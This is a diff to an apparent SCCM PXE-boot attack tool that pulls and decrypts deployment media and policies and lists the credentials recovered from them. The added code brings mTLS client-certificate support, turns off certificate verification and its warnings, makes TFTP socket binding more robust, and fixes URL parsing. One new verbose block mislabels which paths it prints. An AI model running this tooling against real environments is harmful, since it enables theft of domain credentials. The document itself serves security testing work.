@@ -36,6 +36,9 @@ from rich.console import Console
 from Registry import Registry
 from threading import Thread
 
+import urllib3
+from requests_pkcs12 import Pkcs12Adapter
+
 # Scapy global variables
 clientIPAddress = ""
 clientMacAddress = ""
@@ -731,14 +734,23 @@ def make_all_http_requests_and_retrieve_sensitive_policies(CCMClientID, CCMClien
 
     # ClientID is x64UnknownMachineGUID from /SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA request
     # print("[+] Retrieving Needed Metadata from SCCM Server...")
+
+    # Hiding errors 
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    
     if (VERBOSE):
         print_nice("Target Management Point URL: " + SCCM_BASE_URL, "INFO")
     session = requests.Session()
 
+    # This change was made after a request from a Pentester named Joshua Dean, who found that their enviroment was using mTLS and Certiicates 
     if USING_TLS:
         session.verify = False
-        session.cert = (CERT_FILE,KEY_FILE)
+        #session.cert = (CERT_FILE,KEY_FILE)
+        # So odd that SMS_MEDIA_GUID is the password for the PFX, but is truncated to the first 31 chars only
+        session.mount(SCCM_BASE_URL, Pkcs12Adapter(pkcs12_data=binascii.unhexlify(SMS_MEDIA_PFX), pkcs12_password=SMS_MEDIA_GUID[:31]))
+
         #requests.get('https://kennethreitz.org', cert=('/path/client.cert', '/path/client.key')) # supporting client certs
+
     if USING_PROXY:
         proxies = {"https":'127.0.0.1:8080'}
         session.proxies = proxies
@@ -1164,7 +1176,7 @@ class credential_processing_result:
         usernames, passwords = self._deduplicated_credentials()
         if not usernames and not passwords:
             return
-        table = Table(title="Deduplicated Credentials")
+        table = Table(title="Deduplicated Credentials (not combos)")
         table.add_column("Username", justify="center", no_wrap=True)
         table.add_column("Password", justify="center", no_wrap=True)
         # The two lists are independent deduplicated sets; pair them positionally
@@ -1270,7 +1282,8 @@ def extract_key_information_from_variables(input):
             print_nice("Identifying Management Point URL from media variables", "INFO")
 
         if SMSTSMP is not None:
-            SCCM_BASE_URL = SMSTSMP.text
+            # Modifying to fix a bug where if multiple SCCM enviroment variables are found, they default to the first one.
+            SCCM_BASE_URL = SMSTSMP.text.split('*')[0]
         
         #Partial Media - SMSTSLocationMPs
         elif SMSTSLocationMPs is not None:    
@@ -1311,7 +1324,11 @@ def parse_media_files(password:str = None, variables_file:str = None, policy_fil
                 #print_nice("Successfully decrypted media variables file using default/weak password!", "SUCCESS")
                 pass
         else:
-            media_variables = decrypt_media_file(variables_file, password)
+            # Doing this as a way to check for if we use a hex based password (IE your encrypted_key) or a string password (standard set password)
+            if (type(password) == str):
+                media_variables = decrypt_media_file(variables_file, password)
+            else:
+                media_variables = decrypt_pxe_media_from_encrypted_key(password, variables_file)
 
         if (media_variables == None):
             return [None, None]
@@ -1416,12 +1433,45 @@ def download_file_tftp_scapy(server_ip, remote_filename, local_path, server_port
         print_nice(f"TFTP (scapy) GET tftp://{server_ip}:{server_port}/{remote_filename} -> {local_path} (blksize={blksize})", "INFO")
 
     # Choose a client TID (source port). Avoid 68 as that is DHCP.
-    client_tid = 60069
+    preferred_tid = 60069
 
     # Bind a socket so the host does not reply to the first DATA with ICMP
     # port-unreachable (this can abort the transfer on some stacks).
-    dummy_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    dummy_sock.bind((clientIPAddress, client_tid))
+    #
+    # On Windows, binding to a hardcoded port can fail with WinError 10013
+    # (WSAEACCES) when the port falls inside an excluded UDP port range
+    # reserved by Hyper-V / WinNAT (see
+    # `netsh int ipv4 show excludedportrange protocol=udp`). To stay reliable,
+    # try the preferred port first, then fall back to an OS-assigned ephemeral
+    # port (bind to port 0), which Windows guarantees is usable. Binding to the
+    # specific interface IP may also fail if that address is not currently
+    # assigned, so 0.0.0.0 is tried as a final fallback. The socket's actual
+    # bound port is always used as the client TID so the packet source ports
+    # and sniff filters below match what the OS socket holds.
+    dummy_sock = None
+    bind_errors = []
+    for bind_ip, bind_port in (
+        (clientIPAddress, preferred_tid),
+        (clientIPAddress, 0),
+        ("0.0.0.0", 0),
+    ):
+        candidate_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            candidate_sock.bind((bind_ip, bind_port))
+        except (PermissionError, OSError) as bind_err:
+            bind_errors.append(f"{bind_ip}:{bind_port} -> {bind_err}")
+            candidate_sock.close()
+            continue
+        dummy_sock = candidate_sock
+        break
+
+    if dummy_sock is None:
+        print_nice(f"Unable to bind a local TFTP socket (tried {'; '.join(bind_errors)})", "ERROR")
+        return False
+
+    client_tid = dummy_sock.getsockname()[1]
+    if (VERBOSE):
+        print_nice(f"Client TID (source port): {client_tid}", "INFO")
     dummy_sock.setblocking(False)
 
     try:
@@ -1932,7 +1982,7 @@ def _get_pxe_files_sccm(tftp_server_ip, pxe_info):
 
     # If the BCD validated file contains a blank password, use it
     if BLANK_PASSWORDS_FOUND:
-        write_to_file(WORKING_DIR, "encrypted_key", encrypted_key, "binary")
+        write_to_file(WORKING_DIR, "encrypted_key.hex", encrypted_key, "binary")
 
     variables_file_location = os.path.join(WORKING_DIR, variables_filename)
     bcd_file_location = os.path.join(WORKING_DIR, bcd_filename)
@@ -2614,6 +2664,12 @@ if __name__ == "__main__":
                 sys.exit(0)
 
             variables_path, policy_path, bcd_path = scan_for_files(folder)
+            if (VERBOSE):
+                print_nice(f"Variables: {variables_path}", "INFO")
+                print_nice(f"Policy: {variables_path}", "INFO")
+                print_nice(f"BCD: {variables_path}", "INFO")
+
+
             
             if (variables_path == None):
                 print_nice("No media variables file found in folder", "ERROR")
@@ -2640,7 +2696,7 @@ if __name__ == "__main__":
             if (password.startswith("0x")):
                 # Hex encoded password, aka when we have a password used for boot.var files
                 password = binascii.unhexlify(password[2:])
-
+        
         media_variables, decrypted_policy = parse_media_files(password, variables_path, policy_path, bcd_path)
 
         if (media_variables != None):
